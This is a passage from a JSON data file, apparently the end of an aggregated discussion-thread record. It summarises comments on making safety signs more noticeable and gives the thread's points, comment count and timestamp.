      "Suggestions include making signs more visually noticeable by using physical barriers or tweaking door designs to grab attention.",
      "Users also touch upon gender variations, reprimands for safety breaches, the influence of ads on online content, and the use of ad blockers for self-protection."
    ],
    "points": 118,
    "commentCount": 97,
    "retryCount": 0,
    "time": 1711738413
  }
]
